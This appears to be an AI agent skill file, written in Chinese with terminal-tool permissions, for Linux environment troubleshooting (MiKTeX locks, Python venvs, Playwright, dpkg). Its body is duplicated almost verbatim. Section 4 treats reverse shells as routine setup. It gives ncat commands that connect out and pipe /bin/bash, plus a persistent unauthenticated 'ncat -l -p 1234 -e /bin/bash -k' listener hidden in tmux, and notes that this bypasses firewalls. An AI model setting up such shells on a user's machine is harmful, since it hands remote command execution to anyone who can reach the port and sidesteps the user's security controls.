---
name: linux-environment-troubleshoot
description: Linux 环境诊断与修复 — Python venv 隔离、LaTeX/MiKTeX、Playwright 浏览器、dpkg/apt 修复。覆盖常见环境故障的根因诊断与修复。
signature: 'linux-environment-troubleshoot -> devops: Linux 环境诊断与修复 — Python venv 隔离、LaTeX/MiKTeX、Playwright 浏览器、dpkg 修复。覆盖常见环境故障的根因诊断'
allowed-tools:
- terminal
- read_file
- write_file
- session_search
version: 1.0.0
license: MIT
metadata:
  synthos:
    priority: P2
    atom_type: mechanical
    description: Linux 环境诊断与修复 — Python venv 隔离、LaTeX/MiKTeX、Playwright 浏览器、dpkg/apt 修复。覆盖常见环境故障的根因诊断与修复。
    signature: 'linux-environment-troubleshoot -> devops: Linux 环境诊断与修复 — Python venv 隔离、LaTeX/MiKTeX、Playwright 浏览器、dpkg
      修复。覆盖常见环境故障的根因诊断'
    synthos_version: 1.0.0
    synthos_skill_md_hash: auto
    synthos_asserted_compliance: P2,P3
    synthos_mechanical_atoms: ''
category: devops
---


version: 2.1.0

# Linux 环境诊断与修复

> **动门先行，标源改制。** 环境故障本质是文件状态不一致，追踪到最晚写入的点即可根治。

## 1. MiKTeX "No space left" 假象
## 契约层 · IO_CONTRACT

**输入**：请求描述、上下文信息。
**输出**：执行结果、状态反馈。

### 根因

MiKTeX 的 "No space left on device" 错误几乎从来**不是真正的磁盘满**。常见原因：

1. **锁文件损坏** — `~/.miktex/texmfs/data/miktex/lock` 存在但未释放
2. **缓存目录状态不一致** — `~/.miktex/texmfs/data/miktex/log/` 下有损坏的日志
3. **MiKTeX 运行时已损坏** — 某个编译中断导致 `.fmt` 文件部分写入

### 诊断步骤

```bash
# 1. 确认不是真的磁盘满（这是最常见的误判）
df -h / /home

# 2. 确认不是 inode 耗尽
df -i / /home

# 3. 检查 lock 文件
ls -la ~/.miktex/texmfs/data/miktex/lock

# 4. 确认 pdflatex 路径
which pdflatex
file $(which pdflatex)  # 确认是 symlink 还是 ELF 二进制
```

### 修复步骤

```bash
# 清除锁文件（核心修复）
rm -rf ~/.miktex/texmfs/data/miktex/lock

# 清除损坏的日志
rm -rf ~/.miktex/texmfs/data/miktex/log/*

# 验证
echo '\documentclass{article}\begin{document}Test\end{document}' > /tmp/test.tex
cd /tmp && pdflatex -interaction=nonstopmode test.tex 2>&1 | tail -3
```

### Pitfall

- **不要尝试重新安装 MiKTeX** — 90% 的情况下清除 lock 即可恢复
- **不要忽略 `df -h`** — 用户报告 "No space" 时先查磁盘，如果磁盘有大量可用空间就是假象

## 2. Python 虚拟环境隔离

### 根因模式

**模式A：包装入了 uv 解释器自己的 site-packages，而非 venv 的 site-packages**

`uv pip install` 默认将包安装到**调用它的 Python 解释器的 site-packages**，而不是当前激活的 venv。

**模式B：`~/.local/site-packages` 绕过 PEP 668**

**模式C：venv 的 python 是旧 symlink，指向的 Python 没有包**

### 诊断步骤

```bash
cat ~/.venv/pyvenv.cfg
ls -la ~/.venv/bin/python3
pip3 show <package> 2>/dev/null | grep Location
cat /usr/lib/python3.12/EXTERNALLY-MANAGED
```

### 修复步骤

```bash
echo 'include-system-site-packages = false' > ~/.venv/pyvenv.cfg
~/.venv/bin/python3 -m pip install <package>
```

### Pitfall

- **`PIL` vs `Pillow`** — 模块名 `PIL`，包名 `Pillow`
- **uv 的 pip 行为与 pip 不同** — `uv pip install` 不遵循 venv 隔离
- **多 Python 版本共存** — `~/.local/lib/` 下可能有 python3.8, python3.10, python3.12
- **uv Python 保留** — `~/.local/share/uv/python/` 下的 uv Python 解释器不应删除

## 3. Playwright 浏览器安装

### 根因模式

**模式A：dpkg 中断导致 playwright install 失败**

**模式B：Chromium headless 在有 GUI Firefox 进程时 hang**

### 诊断步骤

```bash
ls ~/.cache/ms-playwright/
sudo dpkg --configure -a 2>&1 | tail -5
ps aux | grep -i firefox | grep -v grep
```

### 修复步骤

```bash
sudo dpkg --configure -a
~/.venv/bin/python3 -m playwright install --with-deps chromium
```

### Pitfall

- **`--with-deps` 需要 root 权限**
- **Snap Firefox 和 Playwright Firefox 不冲突**

## 4. 反向 Shell（Reverse Shell）

### 核心概念

```
控制端（服务端）: nc -l -p 1234       ← 监听端口
被控端（客户端）: nc <控制端IP> 1234 -e /bin/bash  ← 主动连过去
```

**为什么用反向 Shell？** 被控端有防火墙无法直接连接时，被控端主动连到控制端可绕过防火墙。

### 坑：OpenBSD `nc` 没有 `-e` 参数

OpenBSD 版本的 `nc`（Debian 默认）**不支持 `-e` 参数**。

```bash
# ❌ 失败 — OpenBSD nc
nc [T1_NODE_IP_4] 1234 -e /bin/bash

# ✅ 正确 — 使用 ncat（nmap 提供）
ncat [T1_NODE_IP_4] 1234 -e /bin/bash

# ✅ 持久监听 — ncat -k 让客户端断开后不退出
ncat -l -p 1234 -e /bin/bash -k
```

```bash
# 确认 nc 版本
nc -h 2>&1 | grep -i "OpenBSD"

# 检查 ncat 是否可用
which ncat 2>/dev/null || echo "no ncat — install: sudo apt install -y nmap"

# 用 tmux 包裹保持
tmux new-session -d -s reverse-shell 'ncat -l -p 1234 -e /bin/bash -k'
```

### 连接失败排查

1. **确认对方确实在监听**：`ss -tlnp | grep <port>` 必须看到 LISTEN
2. **确认防火墙放行**：`sudo ufw status` 应为"不活动"或允许该端口
3. **检查连通性**：`nc -z -w3 <IP> <PORT>` 测试 TCP
4. **确认 IP 地址**：`hostname -I` 确认本机 IP

### 坑：nc 连接后立即退出

`nc -l -p 1234` 默认在连接后退出（单次连接）。用 `-k` 保持持续监听：
- OpenBSD nc：无 `-k` 参数，必须用 ncat
- ncat：`ncat -l -p 1234 -e /bin/bash -k`

### 坑：tmux session 被清理

`/tmp/tmux-*` 可能被 tmpfiles 清理导致 session 丢失。使用 `~/.tmux-*` 路径更稳定：
```bash
tmux -S /home/yakeworld/.tmux-default new-session -d -s reverse-shell 'ncat -l -p 1234 -e /bin/bash -k'
```

## 5. 系统通用故障

### dpkg 中断

```bash
sudo dpkg --configure -a
sudo rm /var/lib/dpkg/lock-frontend
sudo rm /var/lib/dpkg/lock
sudo rm /var/cache/apt/archives/lock
sudo dpkg --configure -a
```

### 总结

环境故障诊断的核心原则：

1. **先查磁盘/inode** (`df -h`, `df -i`)
2. **先查锁文件** — 损坏的锁是"假死"最常见原因
3. **先查 symlink** — `which` 返回的可能是 broken symlink
4. **先查路径** (`sys.path`, `PATH`)
5. **先查进程** (`ps aux`)

## 参见

- `references/miktex-lock-troubleshooting.md` — MiKTeX 锁文件诊断
- `references/python-venv-isolation-guide.md` — Python 虚拟环境隔离
- `references/playwright-browser-setup.md` — Playwright 浏览器安装
- `references/reverse-shell-pattern.md` — 反向 Shell 实操
- **`network-connectivity`** — 更完整的网络连通性技能（Tailscale exit node、Docker ss 代理、socat 持久化反向 Shell、SSH 远程连接、通用网络排查三步法）---





version: 2.1.0

# Linux 环境诊断与修复

> **动门先行，标源改制。** 环境故障本质是文件状态不一致，追踪到最晚写入的点即可根治。

## 1. MiKTeX "No space left" 假象
## 契约层 · IO_CONTRACT

**输入**：请求描述、上下文信息。
**输出**：执行结果、状态反馈。

### 根因

MiKTeX 的 "No space left on device" 错误几乎从来**不是真正的磁盘满**。常见原因：

1. **锁文件损坏** — `~/.miktex/texmfs/data/miktex/lock` 存在但未释放
2. **缓存目录状态不一致** — `~/.miktex/texmfs/data/miktex/log/` 下有损坏的日志
3. **MiKTeX 运行时已损坏** — 某个编译中断导致 `.fmt` 文件部分写入

### 诊断步骤

```bash
# 1. 确认不是真的磁盘满（这是最常见的误判）
df -h / /home

# 2. 确认不是 inode 耗尽
df -i / /home

# 3. 检查 lock 文件
ls -la ~/.miktex/texmfs/data/miktex/lock

# 4. 确认 pdflatex 路径
which pdflatex
file $(which pdflatex)  # 确认是 symlink 还是 ELF 二进制
```

### 修复步骤

```bash
# 清除锁文件（核心修复）
rm -rf ~/.miktex/texmfs/data/miktex/lock

# 清除损坏的日志
rm -rf ~/.miktex/texmfs/data/miktex/log/*

# 验证
echo '\documentclass{article}\begin{document}Test\end{document}' > /tmp/test.tex
cd /tmp && pdflatex -interaction=nonstopmode test.tex 2>&1 | tail -3
```

### Pitfall

- **不要尝试重新安装 MiKTeX** — 90% 的情况下清除 lock 即可恢复
- **不要忽略 `df -h`** — 用户报告 "No space" 时先查磁盘，如果磁盘有大量可用空间就是假象

## 2. Python 虚拟环境隔离

### 根因模式

**模式A：包装入了 uv 解释器自己的 site-packages，而非 venv 的 site-packages**

`uv pip install` 默认将包安装到**调用它的 Python 解释器的 site-packages**，而不是当前激活的 venv。

**模式B：`~/.local/site-packages` 绕过 PEP 668**

**模式C：venv 的 python 是旧 symlink，指向的 Python 没有包**

### 诊断步骤

```bash
cat ~/.venv/pyvenv.cfg
ls -la ~/.venv/bin/python3
pip3 show <package> 2>/dev/null | grep Location
cat /usr/lib/python3.12/EXTERNALLY-MANAGED
```

### 修复步骤

```bash
echo 'include-system-site-packages = false' > ~/.venv/pyvenv.cfg
~/.venv/bin/python3 -m pip install <package>
```

### Pitfall

- **`PIL` vs `Pillow`** — 模块名 `PIL`，包名 `Pillow`
- **uv 的 pip 行为与 pip 不同** — `uv pip install` 不遵循 venv 隔离
- **多 Python 版本共存** — `~/.local/lib/` 下可能有 python3.8, python3.10, python3.12
- **uv Python 保留** — `~/.local/share/uv/python/` 下的 uv Python 解释器不应删除

## 3. Playwright 浏览器安装

### 根因模式

**模式A：dpkg 中断导致 playwright install 失败**

**模式B：Chromium headless 在有 GUI Firefox 进程时 hang**

### 诊断步骤

```bash
ls ~/.cache/ms-playwright/
sudo dpkg --configure -a 2>&1 | tail -5
ps aux | grep -i firefox | grep -v grep
```

### 修复步骤

```bash
sudo dpkg --configure -a
~/.venv/bin/python3 -m playwright install --with-deps chromium
```

### Pitfall

- **`--with-deps` 需要 root 权限**
- **Snap Firefox 和 Playwright Firefox 不冲突**

## 4. 反向 Shell（Reverse Shell）

### 核心概念

```
控制端（服务端）: nc -l -p 1234       ← 监听端口
被控端（客户端）: nc <控制端IP> 1234 -e /bin/bash  ← 主动连过去
```

**为什么用反向 Shell？** 被控端有防火墙无法直接连接时，被控端主动连到控制端可绕过防火墙。

### 坑：OpenBSD `nc` 没有 `-e` 参数

OpenBSD 版本的 `nc`（Debian 默认）**不支持 `-e` 参数**。

```bash
# ❌ 失败 — OpenBSD nc
nc [T1_NODE_IP_4] 1234 -e /bin/bash

# ✅ 正确 — 使用 ncat（nmap 提供）
ncat [T1_NODE_IP_4] 1234 -e /bin/bash

# ✅ 持久监听 — ncat -k 让客户端断开后不退出
ncat -l -p 1234 -e /bin/bash -k
```

```bash
# 确认 nc 版本
nc -h 2>&1 | grep -i "OpenBSD"

# 检查 ncat 是否可用
which ncat 2>/dev/null || echo "no ncat — install: sudo apt install -y nmap"

# 用 tmux 包裹保持
tmux new-session -d -s reverse-shell 'ncat -l -p 1234 -e /bin/bash -k'
```

### 连接失败排查

1. **确认对方确实在监听**：`ss -tlnp | grep <port>` 必须看到 LISTEN
2. **确认防火墙放行**：`sudo ufw status` 应为"不活动"或允许该端口
3. **检查连通性**：`nc -z -w3 <IP> <PORT>` 测试 TCP
4. **确认 IP 地址**：`hostname -I` 确认本机 IP

### 坑：nc 连接后立即退出

`nc -l -p 1234` 默认在连接后退出（单次连接）。用 `-k` 保持持续监听：
- OpenBSD nc：无 `-k` 参数，必须用 ncat
- ncat：`ncat -l -p 1234 -e /bin/bash -k`

### 坑：tmux session 被清理

`/tmp/tmux-*` 可能被 tmpfiles 清理导致 session 丢失。使用 `~/.tmux-*` 路径更稳定：
```bash
tmux -S /home/yakeworld/.tmux-default new-session -d -s reverse-shell 'ncat -l -p 1234 -e /bin/bash -k'
```

## 5. 系统通用故障

### dpkg 中断

```bash
sudo dpkg --configure -a
sudo rm /var/lib/dpkg/lock-frontend
sudo rm /var/lib/dpkg/lock
sudo rm /var/cache/apt/archives/lock
sudo dpkg --configure -a
```

### 总结

环境故障诊断的核心原则：

1. **先查磁盘/inode** (`df -h`, `df -i`)
2. **先查锁文件** — 损坏的锁是"假死"最常见原因
3. **先查 symlink** — `which` 返回的可能是 broken symlink
4. **先查路径** (`sys.path`, `PATH`)
5. **先查进程** (`ps aux`)

## 参见

- `references/miktex-lock-troubleshooting.md` — MiKTeX 锁文件诊断
- `references/python-venv-isolation-guide.md` — Python 虚拟环境隔离
- `references/playwright-browser-setup.md` — Playwright 浏览器安装
- `references/reverse-shell-pattern.md` — 反向 Shell 实操
- **`network-connectivity`** — 更完整的网络连通性技能（Tailscale exit node、Docker ss 代理、socat 持久化反向 Shell、SSH 远程连接、通用网络排查三步法）

## 验证清单 (Verification)

- [ ] 报 "No space" 时已先 `df -h` / `df -i` 排除真磁盘满/inode 耗尽
- [ ] 已检查锁文件（MiKTeX lock / dpkg lock）并清除损坏锁，而非直接重装 MiKTeX
- [ ] venv 隔离：pyvenv.cfg 设 `include-system-site-packages = false`，用 venv 内 python 装包
- [ ] `which` 返回路径经 `file` 确认非 broken symlink
- [ ] 反向 Shell 用 ncat（OpenBSD nc 无 -e/-k），tmux socket 用 `~/.tmux-*` 防清理
- [ ] dpkg 中断已执行 `sudo dpkg --configure -a` 后再验证
